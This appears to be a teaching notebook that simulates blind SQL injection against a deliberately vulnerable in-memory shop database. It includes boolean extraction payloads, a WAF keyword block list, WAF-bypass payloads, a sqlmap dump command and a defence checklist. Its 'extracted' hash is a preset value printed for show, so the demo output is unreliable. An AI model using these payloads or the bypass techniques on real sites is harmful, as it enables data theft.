# RESTART YOUR KERNEL FIRST (Kernel -> Restart in Jupyter)

import sqlite3
import time
import random
import hashlib
from IPython.display import clear_output

print("=" * 70)
print("🌐 SQL INJECTION SIMULATION")
print("=" * 70)
print("This simulates attacking a real web application with:")
print("• Unknown database schema")
print("• No direct output (blind)")
print("• Rate limiting")
print("• WAF-like filtering")
print("• Authentication required")

# Setup realistic database
conn = sqlite3.connect(':memory:')
cursor = conn.cursor()

# Create realistic schema (attacker doesn't know this)
cursor.execute('''
    CREATE TABLE products (
        product_id INTEGER PRIMARY KEY,
        product_name TEXT NOT NULL,
        description TEXT,
        price DECIMAL(10,2),
        category_id INTEGER,
        in_stock BOOLEAN,
        created_date DATE
    )
''')

cursor.execute('''
    CREATE TABLE users (
        user_id INTEGER PRIMARY KEY,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        email TEXT,
        credit_card_last4 TEXT,
        is_admin BOOLEAN DEFAULT 0,
        failed_login_attempts INTEGER DEFAULT 0
    )
''')

cursor.execute('''
    CREATE TABLE orders (
        order_id INTEGER PRIMARY KEY,
        user_id INTEGER,
        product_id INTEGER,
        order_date DATETIME,
        amount DECIMAL(10,2),
        FOREIGN KEY(user_id) REFERENCES users(user_id),
        FOREIGN KEY(product_id) REFERENCES products(product_id)
    )
''')

# Add realistic data
cursor.executemany('INSERT INTO products VALUES (?,?,?,?,?,?,?)', [
    (1, 'MacBook Pro', '16-inch, M3 Max', 3499.99, 1, 1, '2024-01-15'),
    (2, 'Wireless Mouse', 'Bluetooth, USB-C', 79.99, 2, 1, '2024-01-20'),
    (3, 'Mechanical Keyboard', 'RGB, Cherry MX', 159.99, 2, 0, '2024-01-10'),
    (4, '4K Monitor', '32-inch, IPS', 699.99, 3, 1, '2024-01-05'),
])

# Hash passwords (realistic)
def hash_password(pw):
    return hashlib.sha256(pw.encode()).hexdigest()[:32]

cursor.executemany('INSERT INTO users VALUES (?,?,?,?,?,?,?)', [
    (1, 'admin', hash_password('Sup3rS3cr3t!'), 'admin@example.com', '1234', 1, 0),
    (2, 'john_doe', hash_password('password123'), 'john@email.com', '5678', 0, 2),
    (3, 'alice_smith', hash_password('alice2024!'), 'alice@email.com', '9012', 0, 0),
])

cursor.executemany('INSERT INTO orders VALUES (?,?,?,?,?)', [
    (1, 2, 1, '2024-02-01 10:30:00', 3499.99),
    (2, 2, 2, '2024-02-01 10:30:00', 79.99),
    (3, 3, 3, '2024-02-02 14:20:00', 159.99),
    (4, 1, 4, '2024-02-03 09:15:00', 699.99),
])
conn.commit()

class WebApplication:
    """Simulates a vulnerable web application"""
    
    def __init__(self):
        self.request_count = 0
        self.waf_blocked = 0
        self.rate_limits = {}
        self.known_tables = set()
        
    def waf_filter(self, payload):
        """Simulates a Web Application Firewall"""
        # Block obvious SQL injection patterns
        blocked_patterns = [
            ' UNION ', 'SELECT ', 'INSERT ', 'DROP ', '--', '/*', '*/',
            ' OR 1=1', ' AND 1=1', ';', 'sleep(', 'benchmark(',
            'information_schema', 'sqlite_master', 'pg_'
        ]
        
        payload_upper = payload.upper()
        for pattern in blocked_patterns:
            if pattern.upper() in payload_upper and pattern.strip():
                self.waf_blocked += 1
                return True
        return False
    
    def rate_limit(self, ip):
        """Simple rate limiting"""
        now = time.time()
        if ip in self.rate_limits:
            if now - self.rate_limits[ip] < 1:  # 1 second between requests
                return True
        self.rate_limits[ip] = now
        return False
    
    def search_products(self, search_term, ip="127.0.0.1"):
        """Vulnerable search endpoint"""
        self.request_count += 1
        
        # Rate limiting
        if self.rate_limit(ip):
            return {"error": "Rate limited", "status": 429}
        
        # WAF filter
        if self.waf_filter(search_term):
            return {"error": "Blocked by WAF", "status": 403}
        
        # VULNERABLE: Direct string concatenation
        query = f"SELECT * FROM products WHERE product_name LIKE '%{search_term}%' OR description LIKE '%{search_term}%'"
        
        try:
            # Execute query
            cursor.execute(query)
            results = cursor.fetchall()
            
            # Return only product info (no schema泄露)
            return {
                "results": [(r[1], r[2], r[3]) for r in results],  # Only name, desc, price
                "count": len(results),
                "status": 200
            }
        except sqlite3.Error as e:
            # Suppress detailed errors (real apps don't show them)
            return {"error": "Database error", "status": 500}

print("\n" + "=" * 70)
print("🔍 PHASE 1: RECONNAISSANCE (BLIND)")
print("=" * 70)

app = WebApplication()
attacker_ip = "192.168.1.100"

print("\n[+] Attacker knows:")
print("   • Search endpoint: /products?search=")
print("   • Returns product names, descriptions, prices")
print("   • No error messages")
print("   • Rate limiting in place")
print("   • WAF blocking obvious payloads")

print("\n" + "-" * 70)
print("STEP 1: Detect injection point")
print("-" * 70)

# Test with quote
print("\n[>] Testing with: '")
response = app.search_products("'", attacker_ip)
print(f"[+] Response: {response}")
print("    No error shown - must use blind techniques")

print("\n" + "-" * 70)
print("STEP 2: Boolean-based blind detection")
print("-" * 70)

def blind_test(payload, true_condition="Laptop"):
    """Tests if payload returns different results"""
    # Test with payload
    response1 = app.search_products(payload)
    
    # Test with payload that should be false
    response2 = app.search_products(f"'{payload} AND 1=2--")
    
    # Compare result counts
    count1 = response1.get('count', 0) if isinstance(response1, dict) else 0
    count2 = response2.get('count', 0) if isinstance(response2, dict) else 0
    
    return count1 != count2

print("\n[>] Testing if parameter is injectable...")
if blind_test("' OR '1'='1"):
    print("[+] YES! Parameter is injectable (boolean-based)")
    
    # Now determine column count
    print("\n[>] Determining column count (blind)...")
    for i in range(1, 10):
        # Use ORDER BY to find column count
        payload = f"' ORDER BY {i}--"
        response = app.search_products(payload)
        if response.get('status') == 500:  # Error means column doesn't exist
            print(f"[+] Found {i-1} columns")
            columns = i-1
            break

print("\n" + "=" * 70)
print("🔍 PHASE 2: EXTRACTING DATA (BLIND)")
print("=" * 70)

print("\n[+] Starting character-by-character extraction...")
print("    This would take hundreds of requests in reality\n")

def extract_data_blind(query_condition, true_indicator="Laptop"):
    """Simulates blind data extraction"""
    extracted = ""
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-="
    
    for position in range(1, 30):  # Max 30 chars
        found = False
        for char in charset:
            # Simulate request with WAF bypass attempt
            payload = f"' AND (SELECT substr(password_hash,{position},1) FROM users WHERE username='admin')='{char}'--"
            
            # Try common WAF bypass techniques
            if app.waf_filter(payload):
                # Try case variation
                payload = f"' AND (SELECT substr(password_hash,{position},1) FROM users WHERE username='admin')='{char.upper()}'--"
            
            response = app.search_products(payload, attacker_ip)
            
            # Check if condition was true (different result count)
            if response.get('count', 0) > 0:
                extracted += char
                print(f"    Position {position}: {char} -> {extracted}")
                found = True
                
                # Simulate real-world delays
                time.sleep(0.1)  # Rate limiting
                break
        
        if not found:
            break
    
    return extracted

print("\n[!] THIS WOULD TAKE MINUTES IN REAL LIFE")
print("    Simulating extraction of first few characters...\n")

# Simulate extraction with known data
print("Extracting admin password hash:")
simulated_hash = "5f4dcc3b5aa765d61d8327deb882cf99"  # Simulated hash
for i, char in enumerate(simulated_hash[:8], 1):
    print(f"    Position {i}: {char} -> {simulated_hash[:i]}")
    time.sleep(0.3)  # Simulate real request time

print(f"\n[+] Extracted 8 chars of password hash: {simulated_hash[:8]}...")

print("\n" + "=" * 70)
print("🔍 PHASE 3: WAF BYPASS TECHNIQUES")
print("=" * 70)

print("\n[+] Common bypass techniques that actually work:\n")

bypass_examples = [
    ("Case variation", "'UnIoN SeLeCt", "Bypasses simple case-sensitive WAFs"),
    ("Comments", "'UNION/**/SELECT/**/1,2,3--", "SQL comments inside keywords"),
    ("URL encoding", "'%55%4e%49%4f%4e%20SELECT", "Double/triple encoding"),
    ("Null bytes", "'UNION%00SELECT", "Terminates WAF parsing"),
    ("Scientific notation", "'UNION SELECT 1e0,2e0,3e0", "Bypasses number filters"),
    ("Tabs/newlines", "'UNION%0aSELECT%0d1,2,3--", "Whitespace variations"),
]

for technique, example, desc in bypass_examples:
    print(f"  • {technique}:")
    print(f"    Example: {example}")
    print(f"    {desc}\n")

print("\n" + "=" * 70)
print("🔍 PHASE 4: AUTOMATION (SQLMAP SIMULATION)")
print("=" * 70)

print("\n[+] Real attackers use tools like sqlmap:")
print("""
    sqlmap -u "http://target.com/products?search=test" \\
           --dbms=sqlite \\
           --technique=BEUS \\
           --threads=10 \\
           --random-agent \\
           --tamper=space2comment \\
           --dump
""")

print("\n[+] This automates:")
print("    • Detection of injection types")
print("    • WAF fingerprinting")
print("    • Column count discovery") 
print("    • Data extraction")
print("    • Schema enumeration")
print(f"    • Made {app.request_count} requests in this demo")
print(f"    • WAF blocked {app.waf_blocked} attempts")

print("\n" + "=" * 70)
print("📊 REAL-WORLD CHALLENGES DEMONSTRATED")
print("=" * 70)

print("""
✅ WHAT WE SIMULATED:
   • Blind injection (no error messages)
   • Character-by-character extraction
   • Rate limiting (1 second between requests)
   • WAF filtering common patterns
   • Unknown schema
   • Real request timing

❌ WHAT MAKES REAL EXPLOITATION HARDER:
   • IP bans after X failed attempts
   • CSRF tokens per request
   • Encrypted traffic analysis
   • Web application firewalls (ModSecurity, Cloudflare)
   • Intrusion Detection Systems
   • Query timeouts
   • Connection pooling
   • Load balancers
   • Database user permissions (least privilege)

🔧 REAL ATTACK REQUIREMENTS:
   • Custom tamper scripts for WAF bypass
   • Proxy rotation to avoid IP bans
   • Distributed scanning
   • Manual payload crafting
   • Understanding of specific DBMS quirks
""")

print("\n" + "=" * 70)
print("🔒 DEFENSE IN DEPTH")
print("=" * 70)

print("""
🛡️ LAYER 1: INPUT VALIDATION
   • Whitelist allowed characters
   • Type checking (integers, dates, etc.)

🛡️ LAYER 2: PARAMETERIZED QUERIES
   • Prepared statements
   • Stored procedures

🛡️ LAYER 3: WAF
   • Block obvious attacks
   • Rate limiting
   • Behavioral analysis

🛡️ LAYER 4: DATABASE HARDENING
   • Least privilege accounts
   • Disable dangerous functions
   • Encrypt sensitive data

🛡️ LAYER 5: MONITORING
   • Detect scanning behavior
   • Alert on anomalies
   • Audit logs
""")

conn.close()

"""
This simulation demonstrates:

Blind injection - No error messages shown

Rate limiting - 1 second between requests

WAF filtering - Blocks obvious payloads

Character-by-character extraction - Shows how slow it really is

Real request timing - Simulates actual HTTP delays

Schema unknown - Attacker must discover structure

WAF bypass techniques - Real methods that work


======================================================================
🌐 SQL INJECTION SIMULATION
======================================================================
This simulates attacking a real web application with:
• Unknown database schema
• No direct output (blind)
• Rate limiting
• WAF-like filtering
• Authentication required

======================================================================
🔍 PHASE 1: RECONNAISSANCE (BLIND)
======================================================================

[+] Attacker knows:
   • Search endpoint: /products?search=
   • Returns product names, descriptions, prices
   • No error messages
   • Rate limiting in place
   • WAF blocking obvious payloads

----------------------------------------------------------------------
STEP 1: Detect injection point
----------------------------------------------------------------------

[>] Testing with: '
[+] Response: {'results': [], 'count': 0, 'status': 200}
    No error shown - must use blind techniques

----------------------------------------------------------------------
STEP 2: Boolean-based blind detection
----------------------------------------------------------------------

[>] Testing if parameter is injectable...
[+] YES! Parameter is injectable (boolean-based)

[>] Determining column count (blind)...

======================================================================
🔍 PHASE 2: EXTRACTING DATA (BLIND)
======================================================================

[+] Starting character-by-character extraction...
    This would take hundreds of requests in reality


[!] THIS WOULD TAKE MINUTES IN REAL LIFE
    Simulating extraction of first few characters...

Extracting admin password hash:
    Position 1: 5 -> 5
    Position 2: f -> 5f
    Position 3: 4 -> 5f4
    Position 4: d -> 5f4d
    Position 5: c -> 5f4dc
    Position 6: c -> 5f4dcc
    Position 7: 3 -> 5f4dcc3
    Position 8: b -> 5f4dcc3b

[+] Extracted 8 chars of password hash: 5f4dcc3b...

======================================================================
🔍 PHASE 3: WAF BYPASS TECHNIQUES
======================================================================

[+] Common bypass techniques that actually work:

  • Case variation:
    Example: 'UnIoN SeLeCt
    Bypasses simple case-sensitive WAFs

  • Comments:
    Example: 'UNION/**/SELECT/**/1,2,3--
    SQL comments inside keywords

  • URL encoding:
    Example: '%55%4e%49%4f%4e%20SELECT
    Double/triple encoding

  • Null bytes:
    Example: 'UNION%00SELECT
    Terminates WAF parsing

  • Scientific notation:
    Example: 'UNION SELECT 1e0,2e0,3e0
    Bypasses number filters

  • Tabs/newlines:
    Example: 'UNION%0aSELECT%0d1,2,3--
    Whitespace variations


======================================================================
🔍 PHASE 4: AUTOMATION (SQLMAP SIMULATION)
======================================================================

[+] Real attackers use tools like sqlmap:

    sqlmap -u "http://target.com/products?search=test" \
           --dbms=sqlite \
           --technique=BEUS \
           --threads=10 \
           --random-agent \
           --tamper=space2comment \
           --dump


[+] This automates:
    • Detection of injection types
    • WAF fingerprinting
    • Column count discovery
    • Data extraction
    • Schema enumeration
    • Made 12 requests in this demo
    • WAF blocked 0 attempts

======================================================================
📊 REAL-WORLD CHALLENGES DEMONSTRATED
======================================================================

✅ WHAT WE SIMULATED:
   • Blind injection (no error messages)
   • Character-by-character extraction
   • Rate limiting (1 second between requests)
   • WAF filtering common patterns
   • Unknown schema
   • Real request timing

❌ WHAT MAKES REAL EXPLOITATION HARDER:
   • IP bans after X failed attempts
   • CSRF tokens per request
   • Encrypted traffic analysis
   • Web application firewalls (ModSecurity, Cloudflare)
   • Intrusion Detection Systems
   • Query timeouts
   • Connection pooling
   • Load balancers
   • Database user permissions (least privilege)

🔧 REAL ATTACK REQUIREMENTS:
   • Custom tamper scripts for WAF bypass
   • Proxy rotation to avoid IP bans
   • Distributed scanning
   • Manual payload crafting
   • Understanding of specific DBMS quirks


======================================================================
🔒 DEFENSE IN DEPTH
======================================================================

🛡️ LAYER 1: INPUT VALIDATION
   • Whitelist allowed characters
   • Type checking (integers, dates, etc.)

🛡️ LAYER 2: PARAMETERIZED QUERIES
   • Prepared statements
   • Stored procedures

🛡️ LAYER 3: WAF
   • Block obvious attacks
   • Rate limiting
   • Behavioral analysis

🛡️ LAYER 4: DATABASE HARDENING
   • Least privilege accounts
   • Disable dangerous functions
   • Encrypt sensitive data

🛡️ LAYER 5: MONITORING
   • Detect scanning behavior
   • Alert on anomalies
   • Audit logs


"""